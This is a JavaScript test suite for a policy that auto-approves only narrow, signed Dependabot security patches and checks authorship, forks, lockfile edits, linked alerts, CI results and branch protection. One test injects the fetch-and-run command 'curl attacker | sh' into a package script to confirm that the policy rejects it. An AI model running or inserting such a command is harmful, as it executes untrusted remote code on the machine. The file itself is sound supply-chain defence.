import assert from "node:assert/strict";
import test from "node:test";
import {
  validateChanges,
  validateChecks,
  validateProtection,
  validateSecurity,
  validateSource,
} from "./dependency-update-policy.mjs";

const head = "b".repeat(40);
const base = "a".repeat(40);
const repository = "owner/workshop";
function source() {
  return {
    pr: {
      number: 9,
      state: "open",
      draft: false,
      commits: 1,
      user: { id: 49699333, login: "dependabot[bot]", type: "Bot" },
      head: { sha: head, ref: "dependabot/npm_and_yarn/hono-4.13.14", repo: { full_name: repository } },
      base: { sha: base, ref: "main", repo: { full_name: repository } },
    },
    commit: {
      sha: head,
      author: { id: 49699333, login: "dependabot[bot]" },
      commit: { verification: { verified: true, reason: "valid" } },
      parents: [{ sha: base }],
    },
  };
}
function lock(version, integrity) {
  return `lockfileVersion: '9.0'\nimporters:\n  apps/worker:\n    dependencies:\n      hono:\n        specifier: ^${version}\n        version: ${version}\npackages:\n  hono@${version}:\n    resolution: {integrity: ${integrity}}\n    engines: {node: '>=16.9.0'}\nsnapshots:\n  hono@${version}: {}\n`;
}
function change() {
  return [
    [
      { filename: "apps/worker/package.json", status: "modified" },
      { filename: "pnpm-lock.yaml", status: "modified" },
    ],
    JSON.stringify({ scripts: { test: "vitest" }, dependencies: { hono: "^4.13.13" } }),
    JSON.stringify({ scripts: { test: "vitest" }, dependencies: { hono: "^4.13.14" } }),
    lock("4.13.13", "sha512-YWJjZA=="),
    lock("4.13.14", "sha512-ZWZnaA=="),
  ];
}
function alert() {
  return {
    pageInfo: { hasNextPage: false },
    nodes: [
      {
        state: "OPEN",
        vulnerableManifestPath: "pnpm-lock.yaml",
        vulnerableRequirements: "= 4.13.13",
        dependabotUpdate: { pullRequest: { number: 9, headRefOid: head } },
        securityVulnerability: {
          package: { name: "hono", ecosystem: "NPM" },
          firstPatchedVersion: { identifier: "4.13.14" },
        },
        securityAdvisory: { ghsaId: "GHSA-abcd-1234-5678", withdrawnAt: null },
      },
    ],
  };
}

test("allows only a signed bot leaf patch that GitHub links to an open security repair", () => {
  const { pr, commit } = source();
  validateSource(pr, commit, repository, base);
  const update = validateChanges(...change());
  assert.deepEqual(update, { name: "hono", oldVersion: "4.13.13", newVersion: "4.13.14" });
  validateSecurity(alert(), update, pr);
});

test("rejects spoofed authors, forks, signatures, hidden commits and source drift", () => {
  const mutations = [
    ({ pr }) => {
      pr.user.id = 1;
    },
    ({ pr }) => {
      pr.head.repo.full_name = "attacker/workshop";
    },
    ({ commit }) => {
      commit.commit.verification.verified = false;
    },
    ({ pr }) => {
      pr.commits = 2;
    },
    ({ commit }) => {
      commit.parents[0].sha = head;
    },
    ({ pr }) => {
      pr.base.sha = head;
    },
  ];
  for (const mutate of mutations) {
    const value = source();
    mutate(value);
    assert.throws(() => validateSource(value.pr, value.commit, repository, base));
  }
});

test("rejects grouped upgrades, permission/script edits, major/minor/prerelease and unrelated lock changes", () => {
  for (const dependencies of [
    { hono: "^4.13.14", zod: "^4.7.0" },
    { hono: "^5.0.0" },
    { hono: "^4.14.0" },
    { hono: "^4.13.14-rc.1" },
    { hono: "^4.13.12" },
  ]) {
    const args = change();
    args[2] = JSON.stringify({ scripts: { test: "vitest" }, dependencies });
    assert.throws(() => validateChanges(...args));
  }
  const script = change();
  script[2] = JSON.stringify({ scripts: { test: "curl attacker | sh" }, dependencies: { hono: "^4.13.14" } });
  assert.throws(() => validateChanges(...script));
  const lockChange = change();
  lockChange[4] += "overrides: {other: 1.0.0}\n";
  assert.throws(() => validateChanges(...lockChange));
  const fileChange = change();
  fileChange[0].push({ filename: ".github/workflows/ci.yml", status: "modified" });
  assert.throws(() => validateChanges(...fileChange));
});

test("does not mistake a label, unrelated alert, stale head or ambiguous patched version for security provenance", () => {
  const { pr } = source();
  const update = validateChanges(...change());
  const mutations = [
    (value) => {
      value.nodes = [];
    },
    (value) => {
      value.pageInfo.hasNextPage = true;
    },
    (value) => {
      value.nodes[0].dependabotUpdate.pullRequest.number = 10;
    },
    (value) => {
      value.nodes[0].dependabotUpdate.pullRequest.headRefOid = base;
    },
    (value) => {
      value.nodes[0].securityVulnerability.package.name = "zod";
    },
    (value) => {
      value.nodes[0].vulnerableRequirements = ">= 4.0.0";
    },
    (value) => {
      value.nodes[0].state = "DISMISSED";
    },
    (value) => {
      value.nodes[0].securityVulnerability.firstPatchedVersion.identifier = "4.13.15";
    },
    (value) => {
      value.nodes[0].securityAdvisory.withdrawnAt = "2026-01-01";
    },
  ];
  for (const mutate of mutations) {
    const value = alert();
    mutate(value);
    assert.throws(() => validateSecurity(value, update, pr));
  }
});

test("requires current success from the protected Actions provider, not skipped or stale results", () => {
  const checks = ["check", "e2e", "secrets"].map((name) => ({
    name,
    head_sha: head,
    app: { id: 15368 },
    status: "completed",
    conclusion: "success",
  }));
  validateChecks(checks, head);
  assert.throws(() => validateChecks(checks.slice(1), head));
  for (const change of [
    { conclusion: "skipped" },
    { conclusion: "failure" },
    { status: "in_progress" },
    { head_sha: base },
    { app: { id: 1 } },
  ]) {
    assert.throws(() => validateChecks([{ ...checks[0], ...change }, ...checks.slice(1)], head));
  }
  assert.throws(() => validateChecks([...checks, checks[0]], head));
});

test("requires enforceable strict protection without actor bypass or untrusted check providers", () => {
  const rule = {
    requiresStatusChecks: true,
    requiresStrictStatusChecks: true,
    isAdminEnforced: true,
    allowsForcePushes: false,
    allowsDeletions: false,
    bypassPullRequestAllowances: { totalCount: 0 },
    requiredStatusCheckContexts: ["check", "e2e", "secrets"],
    requiredStatusChecks: ["check", "e2e", "secrets"].map((context) => ({ context, app: { databaseId: 15368 } })),
  };
  validateProtection(rule);
  for (const change of [
    { isAdminEnforced: false },
    { requiresStrictStatusChecks: false },
    { allowsForcePushes: true },
    { bypassPullRequestAllowances: { totalCount: 1 } },
    { requiredStatusChecks: rule.requiredStatusChecks.map((check) => ({ ...check, app: null })) },
  ]) {
    assert.throws(() => validateProtection({ ...rule, ...change }));
  }
});
